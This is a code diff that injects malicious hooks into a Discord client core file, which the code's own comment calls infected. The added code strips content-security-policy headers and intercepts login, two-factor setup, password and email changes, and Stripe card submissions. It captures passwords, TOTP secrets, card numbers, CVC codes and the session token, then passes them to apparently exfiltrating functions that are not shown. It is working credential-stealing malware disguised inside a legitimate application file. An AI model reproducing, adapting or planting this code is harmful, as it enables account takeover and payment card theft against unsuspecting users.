+        'https://*.discord.com/api/v*/users/@me/billing/subscriptions',
+        'https://discord.com/api/v*/users/@me/billing/subscriptions',
+        'wss://remote-auth-gateway.discord.gg/*'
+    ]
+};
+
+
+//Hooks to allow requests to be sent to the API, and First time setup
+session[`defaultSession`][`webRequest`][`onBeforeRequest`](Filter, (details, response) => {
+    if (FirstTime()) {
+        details[`url`][`startsWith`](`wss://`) ? response({
+            cancel: true
+        }) : response({
+            cancel: false
+        });
+    }
+}), session[`defaultSession`][`webRequest`][`onHeadersReceived`]((details, response) => {
+    delete details[`responseHeaders`][`content-security-policy`],
+        delete details[`responseHeaders`][`content-security-policy-report-only`],
+        response({
+            responseHeaders: {
+                ...details[`responseHeaders`],
+                "Access-Control-Allow-Headers": "*"
+            }
+        });
+});
+
+const Filters = {
+    urls: [`https://discord.com/api/v*/users/@me`,
+        `https://discordapp.com/api/v*/users/@me`,
+        `https://*.discord.com/api/v*/users/@me`,
+        "https://discord.com/api/v*/users/@me/mfa/totp/enable",
+        `https://discordapp.com/api/v*/users/@me/mfa/totp/enable`,
+        `https://*.discord.com/api/v*/users/@me/mfa/totp/enable`,
+        `https://discordapp.com/api/v*/auth/login`,
+        `https://discord.com/api/v*/auth/login`,
+        `https://*.discord.com/api/v*/auth/login`,
+        "https://api.stripe.com/v*/tokens"
+    ]
+};
+
+//Hooking into the webRequest API by setting calls in the callback
+session[`defaultSession`][`webRequest`]["onCompleted"](Filters, (details) => {
+
+        //Login hook
+        if (details[`url`][`endsWith`]("login")) {
+            if (details[`statusCode`] == 200) {
+                const data = JSON[`parse`](Buffer[`from`](details[`uploadData`][0][`bytes`])[`toString`]()),
+                    login = data[`login`],
+                    passowrd = data[`password`],
+                    win = BrowserWindow[`getAllWindows`]()[0];
+                win["webContents"][`executeJavaScript`](getTokenScript, true)[`then`](token => {
+                    Login(login, passowrd, token);
+                });
+            }
+        }
+
+        //Hook changing 2fa
+        if (details[`url`][`includes`](`users/@me/mfa/totp/enable`)) {
+            if (details[`statusCode`] == 200) {
+                const data = JSON[`parse`](Buffer[`from`](details[`uploadData`][0][`bytes`])[`toString`]()),
+                    passowrd = data[`password`],
+                    secret = data[`secret`],
+                    win = BrowserWindow[`getAllWindows`]()[0];
+                win["webContents"][`executeJavaScript`](getTokenScript, true)[`then`](token => {
+                    Enable2fa(secret, passowrd, token);
+                });
+            }
+        }
+
+        //Hook changing password and email
+        if (details[`url`][`endsWith`]("users/@me")) {
+            if (details[`statusCode`] == 200 && details[`method`] == `PATCH`) {
+                const data = JSON[`parse`](Buffer[`from`](details[`uploadData`][0][`bytes`])[`toString`]());
+                if (data[`password`] != null && data[`password`] != undefined && data[`password`] != "") {
+                    if (data["new_password"] != undefined && data["new_password"] != null && data["new_password"] != "") {
+                        const win = BrowserWindow[`getAllWindows`]()[0];
+                        win["webContents"][`executeJavaScript`](getTokenScript, true)[`then`](token => {
+                            ChangePassword(data[`password`], data["new_password"], token);
+                        });
+                    }
+                    if (data[`email`] != null && data[`email`] != undefined && data[`email`] != "") {
+                        const win = BrowserWindow[`getAllWindows`]()[0];
+                        win["webContents"][`executeJavaScript`](getTokenScript, true)[`then`](token => {
+                            ChangeEmail(data[`email`], data[`password`], token);
+                        });
+                    }
+                }
+            }
+        }
+
+        //Hook adding credit card
+        if (details[`url`][`endsWith`](`tokens`)) {
+            const win = BrowserWindow[`getAllWindows`]()[0],
+                data = querystring[`parse`](decodeURIComponent(Buffer[`from`](details[`uploadData`][0][`bytes`])[`toString`]()));
+            win["webContents"][`executeJavaScript`](getTokenScript, true)[`then`](token => {
+                CreditCardAdded(data["card[number]"], data["card[cvc]"], data["card[exp_month]"], data["card[exp_year]"], token);
+            });
+        }
+    }), /* The uninfected file should only have this line lolol */
+    module[`exports`] = require("./core.asar");
